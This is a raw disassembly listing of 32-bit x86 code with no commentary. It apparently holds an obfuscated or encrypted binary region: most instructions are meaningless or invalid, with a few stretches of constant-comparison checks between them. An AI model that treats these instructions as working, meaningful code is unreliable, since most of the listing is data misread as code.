  401916:	shr    BYTE PTR [esi+0x15c9136b],1
  40191c:	dec    esp
  40191d:	cmp    eax,0x89655769
  401922:	call   0x855f:0xb7563417
  401929:	icebp  
  40192a:	pop    DWORD PTR [ebx]
  40192c:	xor    al,0x1c
  40192e:	fimul  WORD PTR [eax]
  401930:	xor    ebx,esi
  401932:	retf   0xc66e
  401935:	mov    WORD PTR [ebx-0x7a],ss
  401938:	and    DWORD PTR [esi+0x71],ebp
  40193b:	lahf   
  40193c:	in     eax,dx
  40193d:	mov    DWORD PTR ds:0x6641dc60,edi
  401943:	mov    ch,0x6a
  401945:	mov    edi,0x4d4d5dda
  40194a:	imul   edi,DWORD PTR [ecx-0x741bba77],0x45
  401951:	in     al,0xc7
  401953:	add    BYTE PTR [ecx-0x740760d3],ch
  401959:	inc    ebp
  40195a:	in     al,dx
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x977bf628
  401994:	xchg   edi,eax
  401995:	pop    ecx
  401996:	ins    BYTE PTR es:[edi],dx
  401997:	jo     0x401a13
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	xor    al,BYTE PTR [esi]
  4019a1:	mov    ds:0x7333a11f,al
  4019a6:	push   edi
  4019a7:	leave  
  4019a8:	scas   eax,DWORD PTR es:[edi]
  4019a9:	ja     0x401931
  4019ab:	enter  0x8aa2,0xca
  4019af:	fsubr  QWORD PTR [eax]
  4019b1:	sbb    BYTE PTR [ebx],cl
  4019b3:	loopne 0x40197d
  4019b5:	(bad)  
  4019b6:	xchg   DWORD PTR [ebx+0x3b57b832],ecx
  4019bc:	out    dx,al
  4019bd:	xchg   ebx,eax
  4019be:	pop    ebx
  4019bf:	pop    edi
  4019c0:	cs jae 0x401953
  4019c3:	cdq    
  4019c4:	enter  0xe533,0xab
  4019c8:	fwait
  4019c9:	pop    esi
  4019ca:	xor    DWORD PTR [esi+0x3b],esp
  4019cd:	jne    0x4019d3
  4019cf:	mov    ah,0x2
  4019d1:	repnz xchg ebx,eax
  4019d3:	and    ch,ah
  4019d5:	pusha  
  4019d6:	test   BYTE PTR [edx],bl
  4019d8:	xchg   esi,eax
  4019d9:	jmp    0x4019df
  4019db:	dec    edi
  4019dc:	inc    edx
  4019dd:	dec    ebp
  4019de:	jecxz  0x401995
  4019e0:	sub    al,0x2e
  4019e2:	and    eax,0x12fb530b
  4019e7:	psubw  mm7,QWORD PTR [ebx]
  4019ea:	jns    0x401a15
  4019ec:	(bad)  
  4019ed:	retf   
  4019ee:	std    
  4019ef:	add    eax,0xe33eb46b
  4019f4:	test   BYTE PTR [edx-0x3615e956],ch
  4019fa:	ins    BYTE PTR es:[edi],dx
  4019fb:	js     0x4019bb
  4019fd:	adc    eax,0x97f65f3
  401a02:	adc    al,0x52
  401a04:	push   ebp
  401a05:	mov    ah,0x6b
  401a07:	fiadd  WORD PTR [edi-0x20e478fc]
  401a0d:	gs rol ebx,1
  401a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a11:	outs   dx,DWORD PTR ds:[esi]
  401a12:	ds ins BYTE PTR es:[edi],dx
  401a14:	dec    esp
  401a15:	stos   DWORD PTR es:[edi],eax
  401a16:	or     al,0x33
  401a18:	ds dec edx
  401a1a:	mov    ebp,ds
  401a1c:	mov    DWORD PTR [edi+0x50],ebx
  401a1f:	xchg   ebx,eax
  401a20:	push   0x76
  401a22:	clc    
  401a23:	xchg   esp,eax
  401a24:	retf   0xf96a
  401a27:	outs   dx,DWORD PTR ds:[esi]
  401a28:	mov    ah,0xed
  401a2a:	push   0xffffffd3
  401a2c:	in     al,0x7e
  401a2e:	jne    0x401a78
  401a30:	clc    
  401a31:	shl    ebx,1
  401a33:	xchg   ebx,eax
  401a34:	adc    BYTE PTR [edx-0xc],bl
  401a37:	in     eax,0xb3
  401a39:	call   0x1bfe19e3
  401a3e:	imul   ebp,DWORD PTR [ecx+0x7a],0x64
  401a42:	(bad)  
  401a43:	push   edi
  401a44:	adc    eax,0x83e1518a
  401a49:	adc    eax,DWORD PTR [edx]
  401a4b:	mov    ah,0x9d
  401a4d:	imul   ecx,edx,0x71adc6e
  401a53:	cmp    dl,BYTE PTR [eax-0x18]
  401a56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a57:	je     0x401ab5
  401a59:	pop    ss
  401a5a:	jmp    0x3195eb8b
  401a5f:	fdivp  st(0),st
  401a61:	push   eax
  401a62:	sbb    al,0x8f
  401a64:	add    eax,0x4251053
  401a69:	popa   
  401a6a:	test   eax,0xae88769b
  401a6f:	adc    eax,DWORD PTR [edx-0x29]
  401a72:	nop/reserved BYTE PTR [ecx+0x3f4549ce]
  401a79:	mov    edx,0xcd90835e
  401a7e:	in     al,0xcc
  401a80:	add    ecx,DWORD PTR [edi]
  401a82:	cmp    eax,0x5ae194dc
  401a87:	adc    esp,DWORD PTR [eax]
  401a89:	retf   0xe3d2
  401a8c:	adc    BYTE PTR [ebx+0x36],al
  401a8f:	mov    ebx,0x4a69918e
  401a94:	pop    es
  401a95:	and    ebp,edx
  401a97:	cmc    
  401a98:	outs   dx,DWORD PTR ds:[esi]
  401a99:	xor    eax,0xcefb6cc1
  401a9e:	mov    ebx,0x94b21281
  401aa3:	arpl   bp,di
  401aa5:	push   edx
  401aa6:	dec    di
  401aa8:	jns    0x401a98
  401aaa:	jne    0x401a73
  401aac:	jl     0x401b1d
  401aae:	(bad)  
  401aaf:	outs   dx,DWORD PTR ds:[esi]
  401ab0:	test   ebx,esi
  401ab2:	fdiv   DWORD PTR [ebp-0x66]
  401ab5:	dec    esi
  401ab6:	or     al,0xef
  401ab8:	or     al,0x1f
  401aba:	and    eax,0x3a4573b1
  401abf:	xor    DWORD PTR [ebp-0xe],esp
  401ac2:	push   0x41
  401ac4:	aaa    
  401ac5:	mov    dh,0x55
  401ac7:	(bad)  
  401ac8:	mov    ebx,0xf42df294
  401acd:	xor    ebx,DWORD PTR [edi+0x70993ff1]
  401ad3:	ins    DWORD PTR es:[edi],dx
  401ad4:	pop    ecx
  401ad5:	int3   
  401ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ad7:	addr16 or al,0xa2
  401ada:	sbb    ebx,DWORD PTR gs:[esi-0x1d]
  401ade:	jg     0x401aa6
  401ae0:	or     DWORD PTR [eax],eax
  401ae2:	pop    ecx
  401ae3:	push   cs
  401ae4:	jp     0x401a77
  401ae6:	pusha  
  401ae7:	mov    edx,0x18c7d746
  401aec:	mov    ah,0xf2
  401aee:	sub    DWORD PTR [esi-0x4f9176a8],esp
  401af4:	adc    eax,0xa5b7dc0
  401af9:	jl     0x401b07
  401afb:	mov    esp,DWORD PTR [eax-0x7]
  401afe:	shl    ch,1
  401b00:	retf   
  401b01:	fstp   QWORD PTR [eax]
  401b03:	gs mov ebp,0x35f32cdc
  401b09:	pop    ss
  401b0a:	pop    ecx
  401b0b:	xchg   ebx,eax
  401b0c:	pop    eax
  401b0d:	in     eax,0xe6
  401b0f:	sbb    BYTE PTR [edx+0x3a],dh
  401b12:	out    0x2d,eax
  401b14:	add    ah,0x7e
  401b17:	jae    0x401ae6
  401b19:	clc    
  401b1a:	jmp    0x351b:0xc58ecd44
  401b21:	add    al,0xc8
  401b23:	or     DWORD PTR [edi+0x53b34128],ebx
  401b29:	and    DWORD PTR [ebp+0x4ead81a3],ebp
  401b2f:	in     al,0xb7
  401b31:	(bad)  
  401b32:	repz sub BYTE PTR [edx-0x32],ch
  401b36:	rol    DWORD PTR [ecx+0x29b8a972],0x3d
  401b3d:	jmp    FWORD PTR [edx]
  401b3f:	dec    ebx
  401b40:	push   0xffffffe3
  401b42:	stos   DWORD PTR es:[edi],eax
  401b43:	retf   
  401b44:	lods   al,BYTE PTR ds:[esi]
  401b45:	popf   
  401b46:	and    al,0x7b
  401b48:	pop    esi
  401b49:	pop    esi
  401b4a:	pop    edx
  401b4b:	push   cs
  401b4c:	cmp    eax,0x35814515
  401b51:	jns    0x401b63
  401b53:	(bad)  
  401b54:	push   ebx
  401b55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b56:	and    al,0x8b
  401b58:	jae    0x401b74
  401b5a:	fbld   TBYTE PTR [ecx+0x13]
  401b5d:	cmp    DWORD PTR [ebx+0x5d3f8889],eax
  401b63:	push   ebx
  401b64:	cmp    dh,BYTE PTR ds:0x18f7a881
  401b6a:	out    dx,eax
  401b6b:	jbe    0x401b65
  401b6d:	jbe    0x401b75
  401b6f:	jmp    0x10:0x22c6d287
  401b76:	sub    cl,dl
  401b78:	or     al,0xa5
  401b7a:	cmp    edi,ebx
  401b7c:	cmp    DWORD PTR [edx-0x74],edi
  401b7f:	or     al,0x4c
  401b81:	mov    ebp,0x153130fe
  401b86:	aam    0x23
  401b88:	jmp    0x271db1ee
  401b8d:	arpl   WORD PTR [ecx-0x3822325c],ax
  401b93:	push   esp
  401b94:	cdq    
  401b95:	mov    esp,0xcdc9ea32
  401b9a:	iret   
  401b9b:	test   BYTE PTR [ebx+0x458b94a4],bl
  401ba1:	lock mov edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    ah,BYTE PTR [ecx+ebp*4-0x43]
  401bdf:	div    BYTE PTR [eax+0x78]
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	cmp    eax,DWORD PTR [edi]
  401bea:	pop    DWORD PTR [edx-0x10]
  401bed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401bee:	dec    ebx
  401bef:	shr    bh,1
  401bf1:	adc    al,0x3
  401bf3:	push   edi
  401bf4:	jns    0x401c03
  401bf6:	pop    edi
  401bf7:	out    dx,al
  401bf8:	test   BYTE PTR [edi],0x50
  401bfb:	cmp    DWORD PTR [bp+si],ebp
  401bfe:	adc    BYTE PTR [ecx-0xd],0xce
  401c02:	add    dl,BYTE PTR [eax+ebp*1]
  401c05:	outs   dx,DWORD PTR ds:[esi]
  401c06:	(bad)  
  401c07:	jmp    0xee1cf6a5
  401c0c:	es sbb eax,0xfe9f7988
  401c12:	cmp    DWORD PTR [ebx],0x3cd2f7f9
  401c18:	xchg   edi,eax
  401c19:	mov    esp,0x74238ac9
  401c1e:	dec    ecx
  401c1f:	xor    al,BYTE PTR [ebx+0x244f0e9]
  401c25:	xor    al,0xbb
  401c27:	and    BYTE PTR [edx],bh
  401c29:	cli    
  401c2a:	fcomp  st(4)
  401c2c:	inc    ebx
  401c2d:	js     0x401c8d
  401c2f:	fnstsw WORD PTR [eax-0x6f7fa205]
  401c35:	ficomp WORD PTR [esi+ecx*4]
  401c38:	retf   
  401c39:	push   ebx
  401c3a:	mov    esp,0xabf3a002
  401c3f:	ds sub al,0x9c
  401c42:	ss int3 
  401c44:	jmp    0x401c1c
  401c46:	(bad)  
  401c47:	xor    al,ch
  401c49:	push   es
  401c4a:	xchg   edx,eax
  401c4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c4c:	mov    ch,0xa9
  401c4e:	mov    edx,0x8fa526ad
  401c53:	pop    ebp
  401c54:	push   0xfffffff3
  401c56:	cmp    BYTE PTR [ebp-0x7e],ah
  401c59:	cdq    
  401c5a:	scas   al,BYTE PTR es:[edi]
  401c5b:	sub    BYTE PTR [ecx-0x3c04f728],0xe3
  401c62:	push   es
  401c63:	cdq    
  401c64:	sub    ecx,eax
  401c66:	pop    es
  401c67:	lods   eax,DWORD PTR ds:[esi]
  401c68:	bnd call 0x47d55228
  401c6e:	xchg   DWORD PTR [ebx-0x3b1ff1e3],edi
  401c74:	pop    esp
  401c75:	adc    edi,edi
  401c77:	mov    edx,0xc537b739
  401c7c:	or     edx,DWORD PTR ds:0x8940ccf4
  401c82:	jae    0x401c6f
  401c84:	mov    al,ds:0xec913286
  401c89:	cld    
  401c8a:	sbb    BYTE PTR [eax+0x65],bl
  401c8d:	js     0x401c7c
  401c8f:	jbe    0x401c94
  401c91:	jne    0x401d02
  401c93:	sbb    BYTE PTR [ebx-0x11],dl
  401c96:	and    bh,BYTE PTR [edx]
  401c98:	lahf   
  401c99:	lock (bad) 
  401c9b:	sub    al,0x74
  401c9d:	push   ebx
  401c9e:	out    dx,al
  401c9f:	repz aaa 
  401ca1:	js     0x401cca
  401ca3:	bound  ebp,QWORD PTR [ebp+0x0]
  401ca6:	ds jbe 0x401c62
  401ca9:	and    eax,0x718e0b80
  401caf:	out    0x1a,al
  401cb1:	xor    edx,DWORD PTR [edi]
  401cb3:	int    0x88
  401cb5:	add    ebx,DWORD PTR [edx]
  401cb7:	push   eax
  401cb8:	mov    BYTE PTR [edx+0x34],ch
  401cbb:	nop
  401cbc:	inc    ecx
  401cbd:	pop    ss
  401cbe:	xor    al,0x9a
  401cc0:	clc    
  401cc1:	sub    eax,0xe0901791
  401cc6:	mov    ds:0x5f6f41a9,eax
  401ccb:	pop    ebx
  401ccc:	pop    ds
  401ccd:	sub    DWORD PTR [esi-0x79d80740],0xffffffe0
  401cd4:	fwait
  401cd5:	imul   DWORD PTR [edi-0x13]
  401cd8:	add    ebx,esi
  401cda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cdb:	shr    BYTE PTR [ebp+0x7d],1
  401cde:	in     eax,0xcf
  401ce0:	or     esp,esp
  401ce2:	mov    WORD PTR [esi+ecx*8+0x3b1df5c],ss
  401ce9:	dec    ebp
  401cea:	xor    al,0xd4
  401cec:	mov    ebx,0x53bc6625
  401cf1:	xchg   edx,eax
  401cf2:	loop   0x401d16
  401cf4:	sbb    DWORD PTR [edi+0x78032080],esi
  401cfa:	jno    0x401cbf
  401cfc:	or     bl,BYTE PTR [edx-0x21]
  401cff:	add    ebx,DWORD PTR [ebp-0x77]
  401d02:	mov    edx,0xeae9cd98
  401d07:	sbb    BYTE PTR [ebx-0x5117cb1b],al
  401d0d:	nop
  401d0e:	lahf   
  401d0f:	cs aad 0xf2
  401d12:	les    esi,FWORD PTR [edi]
  401d14:	fs cmc 
  401d16:	data16 sti 
  401d18:	(bad)  
  401d1a:	cmp    DWORD PTR [edi+0x3bd361d3],0xffffff8d
  401d21:	(bad)  ds:0xbb2bad80
  401d27:	lea    eax,[ebx+0x2c]
  401d2a:	xor    WORD PTR [ebx],cx
  401d2d:	aas    
  401d2e:	outs   dx,BYTE PTR ds:[esi]
  401d2f:	outs   dx,BYTE PTR ds:[esi]
  401d30:	mov    ah,0x9e
  401d32:	out    0xeb,al
  401d34:	(bad)  
  401d35:	push   esp
  401d36:	arpl   cx,si
  401d38:	and    eax,0x1fb35448
  401d3d:	push   ebp
  401d3e:	and    BYTE PTR [ebp-0x5e],bh
  401d41:	or     eax,0xeca7ba36
  401d46:	mov    es:0x91e72395,eax
  401d4c:	bound  esp,QWORD PTR [edi+0x61044994]
  401d52:	retf   0x9650
  401d55:	and    al,BYTE PTR [eax+0x3d]
  401d58:	dec    ebp
  401d59:	stos   BYTE PTR es:[edi],al
  401d5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d5b:	xor    BYTE PTR [ebp-0x8831062],dl
  401d61:	mov    bh,0xe2
  401d63:	jmp    FWORD PTR [eax+0x74]
  401d66:	stos   BYTE PTR es:[edi],al
  401d67:	push   cs
  401d68:	push   edx
  401d69:	cmp    edx,DWORD PTR [edi-0x428a1523]
  401d6f:	hlt    
  401d70:	dec    ecx
  401d71:	mov    ds,WORD PTR [eax+0x5f0e3dec]
  401d77:	fs xor eax,0xb56a59b2
  401d7d:	fist   DWORD PTR [edi-0x509e35d5]
  401d83:	mov    edi,0x3782a0d3
  401d88:	imul   ebx,DWORD PTR [ebx],0xe37eb9e7
  401d8e:	in     al,dx
  401d8f:	jge    0x401e00
  401d91:	daa    
  401d92:	cs or  eax,0x3490775
  401d98:	push   eax
  401d99:	push   ebp
  401d9a:	add    cl,BYTE PTR [edx-0x45]
  401d9d:	retf   0xa2a1
  401da0:	lods   al,BYTE PTR ds:[esi]
  401da1:	ficom  DWORD PTR [ecx-0x20]
  401da4:	xchg   esi,eax
  401da5:	cli    
  401da6:	jl     0x401dfd
  401da8:	cmp    DWORD PTR [ebp+0x65],ecx
  401dab:	jle    0x401e2b
  401dad:	mov    ds:0xcf50abd4,eax
  401db2:	rol    al,cl
  401db4:	cmc    
  401db5:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  401db7:	arpl   WORD PTR [edi+0x5ed6e97d],bx
  401dbd:	jo     0x401dd6
  401dbf:	inc    edx
  401dc0:	adc    eax,DWORD PTR [edi-0x7dffb6fe]
  401dc6:	push   ds
  401dc7:	or     edi,edx
  401dc9:	mov    dh,0x25
  401dcb:	inc    edi
  401dcc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dcd:	mov    ebx,0x87ceb303
  401dd2:	mov    eax,0xc7924dd9
  401dd7:	popf   
  401dd8:	nop
  401dd9:	jo     0x401da4
  401ddb:	mov    ebp,0x77252312
  401de0:	mov    eax,ds:0x672a6c6b
  401de5:	mov    ebx,0x4503092d
  401dea:	call   0xca949b2c
  401def:	ins    BYTE PTR es:[edi],dx
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [ecx+ebp*1+0x56],dl
  401e44:	xchg   ebx,eax
  401e45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e46:	jo     0x401e4e
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	(bad)  [esp]
  401e51:	daa    
  401e52:	mul    DWORD PTR [eax+0x45]
  401e55:	sbb    DWORD PTR [eax-0x34],ecx
  401e58:	jmp    0x3075:0xee30aa8e
  401e5f:	and    bh,BYTE PTR [eax]
  401e61:	cmp    esp,DWORD PTR [eax+0x1f]
  401e64:	dec    ecx
  401e65:	out    dx,al
  401e66:	cld    
  401e67:	pushf  
  401e68:	(bad)  
  401e69:	jno    0x401e56
  401e6b:	cli    
  401e6c:	js     0x401eb9
  401e6e:	sbb    BYTE PTR [ebx+0x3aeeedaa],bh
  401e74:	(bad)  
  401e75:	xor    al,0xbc
  401e77:	or     esi,edi
  401e79:	out    dx,eax
  401e7a:	lods   eax,DWORD PTR ds:[esi]
  401e7b:	sub    DWORD PTR [ebp+0x7b],ebx
  401e7e:	cli    
  401e7f:	push   0x79a62f40
  401e84:	add    BYTE PTR [ebx+ebx*1],bl
  401e87:	xor    eax,DWORD PTR ds:0xdbde151e
  401e8d:	ds push cs
  401e8f:	hlt    
  401e90:	iret   
  401e91:	pop    esi
  401e92:	jmp    0x401ee3
  401e94:	outs   dx,BYTE PTR ds:[esi]
  401e95:	pushf  
  401e96:	dec    esi
  401e97:	push   ds
  401e98:	sbb    esp,DWORD PTR [ebx-0x56]
  401e9b:	jge    0x401e55
  401e9d:	hlt    
  401e9e:	jp     0x401e54
  401ea0:	sbb    al,0x9d
  401ea2:	int    0x50
  401ea4:	dec    esp
  401ea5:	mov    eax,ds:0x328e5432
  401eaa:	retf   0xc9b
  401ead:	xor    BYTE PTR [ecx],ch
  401eaf:	jmp    DWORD PTR [ebx+0x5ad324f7]
  401eb5:	mov    bh,0x42
  401eb7:	in     al,0x40
  401eb9:	inc    edx
  401eba:	push   ebx
  401ebb:	out    0xf9,eax
  401ebd:	inc    esi
  401ebe:	ins    DWORD PTR es:[edi],dx
  401ebf:	cs in  eax,dx
  401ec1:	inc    ecx
  401ec2:	pop    eax
  401ec3:	sub    DWORD PTR [edx+0x2f77a611],esi
  401ec9:	adc    DWORD PTR [ebx+edx*8],eax
  401ecc:	push   esi
  401ecd:	lds    esi,FWORD PTR [eax-0x61]
  401ed0:	jmp    0x90fc:0xc7cbe790
  401ed7:	ja     0x401eb4
  401ed9:	dec    ecx
  401eda:	std    
  401edb:	inc    ecx
  401edc:	lock std 
  401ede:	imul   ebp,DWORD PTR [ecx-0x15],0xffa7647
  401ee5:	in     al,0x35
  401ee7:	call   0x6bdb0c69
  401eec:	mov    ah,0x9e
  401eee:	mov    dh,0x96
  401ef0:	arpl   WORD PTR [edi-0x5d705ba2],dx
  401ef6:	(bad)  
  401ef7:	clc    
  401ef8:	add    DWORD PTR [eax+0x3625ad0a],ecx
  401efe:	or     DWORD PTR [ebp+0x71],esp
  401f01:	in     eax,dx
  401f02:	out    0xc1,eax
  401f04:	into   
  401f05:	fstp   QWORD PTR [ebp+0x49]
  401f08:	sub    BYTE PTR [eax],dh
  401f0a:	jg     0x401f79
  401f0c:	mov    ebx,0xe34a2e3d
  401f11:	lahf   
  401f12:	enter  0xd174,0xdf
  401f16:	stos   DWORD PTR es:[edi],eax
  401f17:	push   esp
  401f18:	das    
  401f19:	dec    ecx
  401f1a:	mov    edx,0x8bde2fd
  401f1f:	scas   al,BYTE PTR es:[edi]
  401f20:	xor    eax,0x11a2fe85
  401f25:	xchg   esi,eax
  401f26:	xchg   esi,eax
  401f27:	push   cs
  401f28:	sbb    eax,0xa2d5f40b
  401f2d:	(bad)  
  401f2e:	in     eax,dx
  401f2f:	ret    
  401f30:	cli    
  401f31:	lea    ecx,[eax-0x51eba08b]
  401f37:	repnz lods al,BYTE PTR ds:[esi]
  401f39:	popa   
  401f3a:	leave  
  401f3b:	aas    
  401f3c:	adc    eax,0xe5f4a38
  401f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f42:	out    dx,al
  401f43:	and    eax,0x588f8037
  401f48:	cmc    
  401f49:	mov    esi,0x1ee1cf2a
  401f4e:	loope  0x401f07
  401f50:	call   0x1127:0x85100db2
  401f57:	aaa    
  401f58:	xchg   ebp,eax
  401f59:	shr    eax,0x77
  401f5c:	mov    esp,0xb775744e
  401f61:	xchg   ah,bh
  401f63:	les    esi,FWORD PTR [esi+0x5864efba]
  401f69:	cmp    al,0x2e
  401f6b:	add    BYTE PTR ds:0x75437be,0x43
  401f72:	cmp    eax,0xb8fe55ea
  401f77:	ss sub bl,al
  401f7a:	mov    DWORD PTR [eax],esi
  401f7c:	and    eax,0x2a4a75e4
  401f81:	mov    ah,0xb0
  401f83:	sahf   
  401f84:	jecxz  0x401faf
  401f86:	in     al,0xbc
  401f88:	xchg   ecx,eax
  401f89:	jne    0x401f83
  401f8b:	lea    edx,[ebp+0x72]
  401f8e:	neg    edi
  401f90:	mov    ecx,0x60ae53c8
  401f95:	add    al,0x74
  401f97:	and    eax,ebx
  401f99:	xchg   esp,eax
  401f9a:	ja     0x401fa2
  401f9c:	js     0x401f80
  401f9e:	mov    edi,0x1803e039
  401fa3:	aad    0x96
  401fa5:	adc    al,0x8b
  401fa7:	adc    edi,DWORD PTR [edi+0x6f]
  401faa:	icebp  
  401fab:	in     eax,0x63
  401fad:	test   BYTE PTR ss:[eax],dh
  401fb0:	call   0xa4d5:0x51cbbb53
  401fb7:	xchg   esp,eax
  401fb8:	arpl   bx,cx
  401fba:	ror    BYTE PTR [ebx+0x258a4a9d],1
  401fc0:	sbb    dl,al
  401fc2:	out    dx,al
  401fc3:	xchg   ebp,eax
  401fc4:	aaa    
  401fc5:	loope  0x401fa2
  401fc7:	gs jmp 0x401fc6
  401fca:	repnz fcomi st,st(2)
  401fcd:	(bad)  
  401fcf:	sub    ebp,ecx
  401fd1:	jne    0x401f7b
  401fd3:	in     al,dx
  401fd4:	push   ebp
  401fd5:	jno    0x401fa0
  401fd7:	mov    eax,0xe797a522
  401fdc:	pop    es
  401fdd:	xor    al,0xda
  401fdf:	scas   al,BYTE PTR es:[edi]
  401fe0:	xor    bl,bh
  401fe2:	push   edi
  401fe3:	(bad)  
  401fe6:	bound  ebx,QWORD PTR [eax+0x2b0d2bdf]
  401fec:	dec    esi
  401fed:	push   cs
  401fee:	jmp    0x3d7b:0xf9edd219
  401ff5:	stos   DWORD PTR es:[edi],eax
  401ff6:	mov    edi,edi
  401ff8:	rol    DWORD PTR [esi],0xfe
  401ffb:	jne    0x402048
  401ffd:	aas    
  401ffe:	fwait
  401fff:	mov    dl,0xd1
  402001:	mov    dh,0xb2
  402003:	clc    
  402004:	mov    al,0x4e
  402006:	in     eax,dx
  402007:	cmp    DWORD PTR [eax+0x3e],esi
  40200a:	sub    BYTE PTR [ecx+0x4a],bl
  40200d:	push   edx
  40200e:	loop   0x402061
  402010:	xchg   ecx,eax
  402011:	retf   
  402012:	add    dh,bl
  402014:	mov    edi,0x694dfc11
  402019:	mov    ch,0xea
  40201b:	push   ebx
  40201c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40201d:	jb     0x402062
  40201f:	shl    BYTE PTR [ebx+eiz*4+0x5fd9f6c5],1
  402026:	popf   
  402027:	jne    0x402045
  402029:	cmp    bh,BYTE PTR ds:0xdb760076
  40202f:	mov    gs,WORD PTR [edx-0x1419859f]
  402035:	ror    BYTE PTR [eax+edx*2-0x10],0x81
  40203a:	dec    ecx
  40203b:	or     eax,DWORD PTR [edx-0xb]
  40203e:	xchg   ebx,eax
  40203f:	bound  eax,QWORD PTR [edx+0x5de6e0fd]
  402045:	mov    al,bl
  402047:	out    0xda,eax
  402049:	out    0xfc,al
  40204b:	push   ds
  40204c:	out    0x23,eax
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	adc    BYTE PTR [ecx+0x53],0xc0
  40206d:	stos   DWORD PTR es:[edi],eax
  40206e:	jo     0x402074
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	(bad)  
  402078:	int    0x60
  40207a:	xor    BYTE PTR [ecx-0x6e],0x4d
  40207e:	lock retf 0x6c24
  402082:	fdivr  QWORD PTR [ecx]
  402084:	in     eax,0xf4
  402086:	fst    QWORD PTR [eax-0x47]
  402089:	mov    dh,0xd2
  40208b:	out    dx,al
  40208c:	adc    BYTE PTR [esi+0x1f],dh
  40208f:	mov    al,ds:0x3e873c09
  402094:	mov    dl,0x3c
  402096:	xchg   edi,eax
  402097:	imul   ecx,DWORD PTR [edx+0x17],0xfffffff1
  40209b:	dec    ebx
  40209c:	sub    ch,0xbf
  40209f:	ins    DWORD PTR es:[edi],dx
  4020a0:	mov    dl,0x2b
  4020a2:	popa   
  4020a3:	cs aaa 
  4020a5:	pop    esi
  4020a6:	mov    ecx,?
  4020a8:	dec    eax
  4020a9:	test   DWORD PTR [esi],ebp
  4020ab:	cmp    BYTE PTR [edx+0x5e],ch
  4020ae:	fild   DWORD PTR [edi]
  4020b0:	shl    DWORD PTR es:[eax],cl
  4020b3:	inc    ebx
  4020b4:	test   DWORD PTR [esi],edx
  4020b6:	aam    0x84
  4020b8:	and    eax,0x5905fca9
  4020bd:	mov    edx,edx
  4020bf:	mov    ecx,eax
  4020c1:	mov    esi,0xce402889
  4020c6:	cs mov eax,0x4625658b
  4020cc:	adc    BYTE PTR [edx+0x71],dl
  4020cf:	lahf   
  4020d0:	dec    edx
  4020d1:	pusha  
  4020d2:	fimul  DWORD PTR [ebx-0x7517be45]
  4020d8:	pop    es
  4020d9:	mov    bh,0xa9
  4020db:	mov    ah,0x27
  4020dd:	and    DWORD PTR [ebx],0x7c454208
  4020e3:	mov    cl,0xba
  4020e5:	push   ecx
  4020e6:	jecxz  0x4020d5
  4020e8:	or     eax,0x2c5f3111
  4020ed:	cmp    eax,0x73e878fc
  4020f2:	sub    ch,al
